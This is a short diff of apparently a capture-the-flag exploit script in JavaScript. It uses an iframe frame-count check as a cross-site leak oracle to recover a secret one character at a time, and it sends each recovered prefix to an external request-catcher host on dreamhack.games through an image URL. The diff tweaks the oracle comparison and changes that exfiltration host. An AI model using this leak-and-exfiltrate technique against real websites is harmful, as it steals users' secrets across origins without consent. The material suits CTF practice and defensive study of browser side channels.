@@ -11,7 +11,7 @@
             iframe.onload = () => {
                 try {
                     let result = iframe.contentWindow.frames.length;
-                    resolve(result > 0);
+                    resolve(result != 0);
                 } catch (e) {
                     resolve(false);
                 }
@@ -35,13 +35,13 @@
                 if (rslt.success) {
                     secret += rslt.char;
                     found = true;
-                    img.src = `https://rwawwcz.request.dreamhack.games/${secret}`;
+                    img.src = `https://xwdymwe.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
 
             if (!found) {
-                img.src = `https://rwawwcz.request.dreamhack.games/failed`;
+                img.src = `https://xwdymwe.request.dreamhack.games/failed`;
                 break;
             }
         }
